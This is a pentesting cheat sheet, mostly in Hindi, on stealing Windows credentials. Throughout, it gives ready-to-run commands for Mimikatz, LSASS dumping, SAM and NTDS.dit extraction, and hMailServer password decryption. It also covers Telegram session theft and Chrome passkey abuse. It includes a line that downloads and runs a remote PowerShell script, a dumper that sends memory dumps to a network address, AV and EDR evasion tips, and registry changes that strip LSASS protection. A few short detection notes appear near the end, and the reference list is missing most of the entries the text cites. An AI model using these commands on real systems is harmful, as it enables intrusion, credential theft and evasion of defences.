# Windows Credentials चुराना

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**[इस पेज](credentials-mimikatz.md) में Mimikatz द्वारा किए जा सकने वाले अन्य कार्य खोजें।**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**कुछ संभावित credentials protections के बारे में यहां जानें।**](credentials-protections.md) **ये protections Mimikatz को कुछ credentials extract करने से रोक सकती हैं।**

## Meterpreter के साथ Credentials

मेरे द्वारा बनाए गए [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) का उपयोग victim के अंदर **passwords और hashes खोजने** के लिए करें।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को बायपास करना

### Procdump + Mimikatz

क्योंकि **[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) से Procdump एक वैध Microsoft tool है**, इसे Defender द्वारा detect नहीं किया जाता।\
आप इस tool का उपयोग **lsass process को dump करने**, **dump को download करने** और dump से **credentials को locally extract करने** के लिए कर सकते हैं।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead of** the **name lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo)** के साथ automate कर सकते हैं।**

### **Task Manager से lsass dump करना**

1. Task Bar पर right-click करें और Task Manager पर click करें
2. More details पर click करें
3. Processes tab में "Local Security Authority Process" process खोजें
4. "Local Security Authority Process" process पर right-click करें और "Create dump file" पर click करें।

### procdump से lsass dump करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) एक Microsoft signed binary है, जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade से lsass Dump करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है, जो memory dump को obfuscate करने और उसे disk पर लिखे बिना remote workstations पर transfer करने में support करता है।

**मुख्य functionalities**:

1. PPL protection को bypass करना
2. Defender के signature-based detection mechanisms से बचने के लिए memory dump files को obfuscate करना
3. disk पर file लिखे बिना RAW और SMB upload methods का उपयोग करके memory dump upload करना (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump के बिना SSP-based LSASS dumping

Ink Dragon एक three-stage dumper, **LalsDumper**, प्रदान करता है, जो कभी भी `MiniDumpWriteDump` को call नहीं करता, इसलिए उस API पर लगे EDR hooks कभी trigger नहीं होते:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 lowercase `d` characters से बने placeholder को खोजता है, उसे `rtu.txt` के absolute path से overwrite करता है, patched DLL को `nfdp.dll` के रूप में save करता है और `AddSecurityPackageA("nfdp","fdp")` को call करता है। इससे **LSASS** malicious DLL को नए Security Support Provider (SSP) के रूप में load करने के लिए बाध्य होता है।
2. **LSASS के अंदर Stage 2** – जब LSASS `nfdp.dll` को load करता है, तो DLL `rtu.txt` को पढ़ता है, प्रत्येक byte को `0x20` के साथ XOR करता है और execution transfer करने से पहले decoded blob को memory में map करता है।
3. **Stage 3 dumper** – mapped payload hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) से resolved **direct syscalls** का उपयोग करके MiniDump logic को फिर से लागू करता है। `Tom` नाम का dedicated export `%TEMP%\<pid>.ddt` को open करता है, compressed LSASS dump को file में stream करता है और handle को close कर देता है, ताकि exfiltration बाद में की जा सके।

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll` और `rtu.txt` को एक ही directory में रखें। Stage 1 hard-coded placeholder को `rtu.txt` के absolute path से rewrite करता है, इसलिए इन्हें अलग करने पर chain टूट जाती है।
* Registration, `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में `nfdp` जोड़कर होता है। LSASS को हर boot पर SSP reload कराने के लिए आप उस value को स्वयं seed कर सकते हैं।
* `%TEMP%\*.ddt` files compressed dumps होती हैं। उन्हें locally decompress करें, फिर credential extraction के लिए Mimikatz/Volatility में feed करें।
* `lals.exe` चलाने के लिए admin/SeTcb rights आवश्यक हैं, ताकि `AddSecurityPackageA` सफल हो सके; call के return होने के बाद LSASS rogue SSP को transparently load करता है और Stage 2 execute करता है।
* Disk से DLL हटाने पर वह LSASS से evict नहीं होती। Registry entry delete करके LSASS को restart (reboot) करें या long-term persistence के लिए उसे वहीं रहने दें।

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्ष्य DC से NTDS.dit Dump करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### target DC से NTDS.dit password history Dump करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit account के लिए pwdLastSet attribute दिखाएं
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM और SYSTEM चुराना

ये files _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM._ में **स्थित** होनी चाहिए। लेकिन **आप इन्हें सामान्य तरीके से कॉपी नहीं कर सकते**, क्योंकि ये protected हैं।

### Registry से

इन files को चुराने का सबसे आसान तरीका Registry से इनकी एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**उन फ़ाइलों को डाउनलोड करें** और **hashes निकालें** using:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस service का उपयोग करके protected files की copy बना सकते हैं। आपके पास Administrator privileges होना आवश्यक है।

#### Using vssadmin

vssadmin binary केवल Windows Server versions में उपलब्ध है
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप **Powershell** से भी यही कर सकते हैं। यह **SAM file को copy करने का तरीका** है (इस्तेमाल की गई hard drive "C:" है और इसे C:\users\Public में save किया गया है), लेकिन आप इसका उपयोग किसी भी protected file को copy करने के लिए कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
पुस्तक का Code: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

अंततः, आप SAM, SYSTEM और ntds.dit की एक copy बनाने के लिए [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का भी उपयोग कर सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** फ़ाइल को **Active Directory** का हृदय माना जाता है, जिसमें user objects, groups और उनकी memberships से संबंधित महत्वपूर्ण data होता है। Domain users के **password hashes** इसी में store होते हैं। यह फ़ाइल एक **Extensible Storage Engine (ESE)** database है और **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित होती है।

इस database में तीन primary tables maintain की जाती हैं:

- **Data Table**: यह table users और groups जैसे objects की details store करती है।
- **Link Table**: यह group memberships जैसे relationships का record रखती है।
- **SD Table**: प्रत्येक object के **security descriptors** यहां रखे जाते हैं, जिससे stored objects की security और access control सुनिश्चित होती है।

Christoffer Andersson का database-layer research इन tables और उनके version-specific behavior को अधिक detail में document करता है।<sup>[[8]](#references)</sup>

Windows उस फ़ाइल के साथ interact करने के लिए _Ntdsa.dll_ का उपयोग करता है और इसका उपयोग _lsass.exe_ द्वारा किया जाता है। इसलिए, **NTDS.dit** फ़ाइल का **part** **`lsass`** memory के अंदर located हो सकता है (performance improve करने के लिए **cache** के उपयोग के कारण संभवतः latest accessed data मिल सकता है)।

#### NTDS.dit के अंदर hashes को decrypt करना

Hash को तीन बार encrypt किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके Password Encryption Key (**PEK**) को decrypt करें।
2. **PEK** और **RC4** का उपयोग करके **hash** को decrypt करें।
3. **DES** का उपयोग करके **hash** को decrypt करें।

**PEK** की value प्रत्येक domain controller पर **same** होती है, लेकिन यह उस domain controller के **SYSTEM** hive से प्राप्त DC-specific **BOOTKEY** द्वारा **NTDS.dit** के अंदर encrypted होती है। इसलिए credentials extract करने के लिए **NTDS.dit** और **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) दोनों की आवश्यकता होती है।

### Ntdsutil का उपयोग करके NTDS.dit copy करना

Windows Server 2008 से उपलब्ध।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप **NTDS.dit** फ़ाइल को कॉपी करने के लिए [**volume shadow copy**](#stealing-sam-and-system) तकनीक का भी उपयोग कर सकते हैं। याद रखें कि आपको **SYSTEM file** की एक कॉपी भी चाहिए होगी (फिर से, [**इसे registry से dump करें या volume shadow copy**](#stealing-sam-and-system) तकनीक का उपयोग करें)।

### **NTDS.dit से hashes निकालना**

जब आप **NTDS.dit** और **SYSTEM** फ़ाइलें **प्राप्त कर लें**, तो आप hashes **extract करने** के लिए _secretsdump.py_ जैसे tools का उपयोग कर सकते हैं:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक valid domain admin user का उपयोग करके इन्हें **स्वचालित रूप से extract** भी कर सकते हैं:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**बड़ी NTDS.dit files** के लिए इसे [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके extract करने की recommend की जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से domain objects को SQLite database में extract करना**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) की सहायता से NTDS objects को SQLite database में extract किया जा सकता है। केवल secrets ही extract नहीं किए जाते, बल्कि आगे की information extraction के लिए उनके पूरे objects और attributes भी extract किए जाते हैं, जब raw NTDS.dit file पहले ही retrieve की जा चुकी हो।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive वैकल्पिक है, लेकिन यह secrets को decrypt करने की अनुमति देता है (NT और LM hashes, cleartext passwords जैसे supplemental credentials, kerberos या trust keys, NT और LM password histories)। अन्य जानकारी के साथ, निम्नलिखित data extract किया जाता है: user और machine accounts उनके hashes के साथ, UAC flags, last logon और password change का timestamp, accounts का description, names, UPN, SPN, groups और recursive memberships, organizational units tree और membership, trusted domains जिनमें trusts type, direction और attributes शामिल हैं...

## Lazagne

[यहाँ](https://github.com/AlessandroZ/LaZagne/releases) से binary download करें। आप इस binary का उपयोग कई software से credentials extract करने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से credentials निकालने के लिए अन्य tools

### Windows credentials Editor (WCE)

इस tool का उपयोग memory से credentials निकालने के लिए किया जा सकता है। इसे यहाँ से download करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM file से credentials extract करें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे यहाँ से download करें:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस इसे **execute करें**, passwords extract हो जाएंगे।

## Idle RDP sessions की mining और security controls को कमजोर करना

Ink Dragon के FinalDraft RAT में एक `DumpRDPHistory` tasker शामिल है, जिसकी techniques किसी भी red-teamer के लिए उपयोगी हैं:<sup>[[3]](#references)</sup>

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर प्रत्येक user hive को parse करें। प्रत्येक subkey में server name, `UsernameHint` और last write timestamp store होता है। आप PowerShell के साथ FinalDraft की logic को replicate कर सकते हैं:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log में Event IDs **21** (successful logon) और **25** (disconnect) को query करके यह पता लगाएं कि box को किसने administer किया:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

जब आपको पता चल जाए कि कौन-सा Domain Admin नियमित रूप से connect करता है, तो उसकी **disconnected** session मौजूद रहने के दौरान LSASS को (LalsDumper/Mimikatz के साथ) dump करें। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें बाद में SMB/WinRM पर replay करके `NTDS.dit` हासिल किया जा सकता है या domain controllers पर persistence stage की जा सकती है।

### FinalDraft द्वारा targeted Registry downgrades

वही implant credential theft को आसान बनाने के लिए कई registry keys के साथ भी छेड़छाड़ करता है:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` सेट करने से RDP के दौरान full credential/ticket reuse लागू होता है, जिससे pass-the-hash style pivots संभव हो जाते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को disable करता है, इसलिए local admins को network पर unrestricted tokens मिलते हैं।
* `DSRMAdminLogonBehavior=2` DSRM administrator को DC के online रहते log on करने देता है, जिससे attackers को एक और built-in high-privilege account मिल जाता है।
* `RunAsPPL=0` LSASS PPL protections हटा देता है, जिससे LalsDumper जैसे dumpers के लिए memory access आसान हो जाता है।

## hMailServer database credentials (post-compromise)

hMailServer अपना DB password `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` में `[Database] Password=` के अंतर्गत store करता है। यह value static key `THIS_KEY_IS_NOT_SECRET` और 4-byte word endianness swaps के साथ Blowfish-encrypted होती है। INI से hex string का उपयोग इस Python snippet के साथ करें:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
स्पष्ट-पाठ password के साथ, file locks से बचने के लिए SQL CE database की copy बनाएं, 32-bit provider load करें, और hashes पर query करने से पहले आवश्यकता होने पर upgrade करें:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` column hMailServer hash format (hashcat mode `1421`) का उपयोग करता है। इन values को cracking करने से WinRM/SSH pivots के लिए पुन: उपयोग योग्य credentials मिल सकते हैं।

## LSA Logon Callback Interception (LsaApLogonUserEx2)

कुछ tooling `LsaApLogonUserEx2` LSA logon callback को intercept करके **plaintext logon passwords** capture करती है। इसका उद्देश्य authentication package callback को hook या wrap करना है, ताकि credentials को **logon के दौरान** (hashing से पहले) capture किया जा सके और फिर disk पर लिखा या operator को वापस भेजा जा सके। इसे आमतौर पर ऐसे helper के रूप में implement किया जाता है जो LSA में inject या register होता है और प्रत्येक सफल interactive/network logon event के username, domain और password को record करता है।<sup>[[1]](#references)</sup>

Operational notes:
- Authentication path में helper लोड करने के लिए local admin/SYSTEM आवश्यक है।
- Captured credentials केवल logon होने पर दिखाई देते हैं (hook के आधार पर interactive, RDP, service या network logon)।

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) saved connection information को प्रति-user `sqlstudio.bin` file में store करता है। Dedicated dumpers इस file को parse करके saved SQL credentials recover कर सकते हैं। ऐसे shells में जो केवल command output return करते हैं, file को अक्सर Base64 के रूप में encode करके stdout पर print करके exfiltrate किया जाता है।<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
ऑपरेटर की ओर, credentials पुनर्प्राप्त करने के लिए फ़ाइल को फिर से build करें और dumper को स्थानीय रूप से चलाएँ:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Telegram Desktop `tdata` session theft

Telegram Desktop authorization और account state को अपनी **`tdata`** directory में रखता है। कॉपी किए गए session को compatible tooling द्वारा account password के बिना authenticate करने के लिए लोड किया जा सकता है, जब तक वह authorization valid रहती है; यदि local-data encryption enabled है, तो stealer को उसका passcode भी चाहिए। इसके बाद authenticated session identity data, dialog और membership metadata, messages तथा downloadable media को expose कर सकता है।<sup>[[10]](#references)</sup>

### Discovery और acquisition

Installed और portable layouts, दोनों में search करें; Microsoft Store package names अलग-अलग हो सकते हैं, इसलिए `TelegramMessenge` वाली package directories को enumerate करें और उनकी `LocalCache\Roaming` subtree का निरीक्षण करें।<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
यदि सामान्य reads विफल हो जाएं और process token में `SeBackupPrivilege` **पहले से मौजूद और enabled** हो, तो backup-aware access एक fallback प्रदान करता है; यह privilege प्राप्त नहीं करता और न ही process को elevate करता है। `FILE_FLAG_BACKUP_SEMANTICS` के साथ `CreateFileW` backup/restore semantics का अनुरोध कर सकता है और आवश्यक token privileges मौजूद होने पर file security checks को override कर सकता है, लेकिन केवल यह flag किसी असंगत sharing lock को bypass नहीं करता।<sup>[[10]](#references)[[11]](#references)</sup>

Live locked files के लिए एक **Volume Shadow Copy** बनाएं; ACL-blocked files के लिए `robocopy /B` backup mode का उपयोग करता है और file तथा directory ACLs को override करता है।<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
एक bandwidth-conscious implant पहले केवल file-path inventory भेज सकता है, फिर एक snapshot identifier और C2 द्वारा पहले से stored paths प्राप्त करके केवल missing files upload कर सकता है। इसलिए recursive `tdata` enumeration के बाद होने वाले छोटे incremental transfers भी successful session theft का संकेत हो सकते हैं।<sup>[[10]](#references)</sup>

### Detection और containment

किसी non-Telegram process द्वारा `tdata` तक recursive access को `SeBackupPrivilege` enablement, backup-semantics file opens, VSS activity, या `/B` का उपयोग करने वाले child `robocopy.exe` के साथ correlate करें। साथ ही, `%APPDATA%` और `%LOCALAPPDATA%\Packages` दोनों की तेज़ enumeration के बाद उसी process से होने वाले outbound connections की भी तलाश करें। Compromise के बाद, अपरिचित sessions को terminate करने के लिए **Settings → Devices** (या **Privacy & Security → Active Sessions**) का उपयोग करें; केवल two-step verification enable करने से पहले से चुराई गई authorization revoke नहीं होती।<sup>[[10]](#references)[[13]](#references)</sup>

## Windows पर Chrome से Passkeys / WebAuthn credential theft

यदि **Chrome + Google Password Manager synced passkeys** का उपयोग करने वाले Windows host पर **victim user** के रूप में code execution प्राप्त हो जाए, तो passkeys एक interesting post-exploitation target बन जाते हैं, वह भी **admin/SYSTEM** के बिना।<sup>[[4]](#references)</sup>

### Interesting local artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** protobuf-encoded **`WebauthnCredentialSpecifics`** records संग्रहीत करता है। Same-user process synced passkeys के **RP ID**, **username**, **credential ID**, और encrypted private-key material को enumerate कर सकता है।<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** local device-enrollment state, जैसे **`wrapped_identity_private_key`** और synced credentials को recover करने के लिए उपयोग किए जाने वाले wrapped secret को संग्रहीत करता है।<sup>[[4]](#references)</sup>

त्वरित triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs का फिर भी local signing oracle के रूप में दुरुपयोग किया जा सकता है

यदि browser किसी TPM-backed identity key को **`NCRYPT_OPAQUE_KEY_BLOB`** के रूप में export करता है और उस blob को user-accessible state में store करता है, तो malware को raw private key extract करने की आवश्यकता नहीं होती। वह उसी machine पर blob को फिर से import कर सकता है और attacker-controlled data पर sign करने के लिए local TPM से अनुरोध कर सकता है:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
इसका अर्थ है कि **hardware binding off-device export को रोकता है, लेकिन compromised endpoint पर उसी user के उपयोग को नहीं रोकता**।

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome के LevelDB से `WebauthnCredentialSpecifics` enumerate करें।
- Passkey login शुरू करें और एक fresh WebAuthn challenge प्राप्त करें।
- Cloud-authenticator request binding पर sign करने के लिए victim TPM पर चुराए गए `wrapped_identity_private_key` blob का उपयोग करें।
- लौटाए गए assertion को relying party तक relay करें।
- यह विशेष रूप से तब उपयोगी है जब RP `userVerification=preferred` स्वीकार करता हो या **`UV=0`** वाले assertions को reject करने में विफल हो।
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` हटाकर या valid signed `device/forget` operation भेजकर re-onboarding force करें।
- यदि onboarding के बाद device **`uv_key_pending`** स्थिति में रहता है, तो attacker-controlled UV public key register करें।
- यदि provider नई UV key के लिए attestation / secure-hardware origin verify नहीं करता, तो attacker key से बाद में किए गए signatures को **`UV=1`** माना जाता है।
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Recovery या rejoin force करें, ताकि Chrome synced-passkey master secret fetch करे।
- `passkey_enclave_state` के recreation/modification पर नज़र रखें, फिर Chrome memory dump करें, जब plaintext **security domain secret (SDS)** memory में मौजूद हो।
- Recovered SDS का उपयोग प्रत्येक `WebauthnCredentialSpecifics` record में encrypted fields को decrypt करने और portable WebAuthn private keys recover करने के लिए करें।

### DFIR / detection ideas

- **`passkey_enclave_state`** के **deletion/recreation** को monitor करें।<sup>[[4]](#references)</sup>
- Non-browser processes द्वारा Chrome **`Sync Data\LevelDB`** तक abnormal access पर alert करें।
- **Chrome memory dumps** या suspicious cross-process memory access पर alert करें।
- बार-बार आने वाले **Google Password Manager recovery PIN** prompts या unexpected re-onboarding की जाँच करें।
- ध्यान रखें कि synced passkeys के लिए WebAuthn **`signCount`** अक्सर उपयोगी नहीं होता, क्योंकि यह constant रह सकता है; इसलिए classic clone detection कमजोर होती है।

## References

- [1] [Unit 42 – उच्च-मूल्य वाले क्षेत्रों को target करने वाले वर्षों से undetected operations की जाँच](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP के माध्यम से Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: relay network और stealthy offensive operation की inner workings का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
